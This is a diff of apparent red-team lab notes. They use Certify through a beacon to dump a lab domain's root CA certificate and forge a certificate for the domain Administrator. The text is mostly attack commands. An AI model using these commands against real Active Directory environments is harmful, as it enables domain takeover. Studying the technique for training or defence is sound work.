@@ -101,4 +101,5 @@ enumeration using certify
             beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
         save to our desktop for future use
             PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("PFX"))
-        
+        now we can this to forge certs
+            PS C:\Users\Attacker> C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\contoso-root-ca.pfx --quiet --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
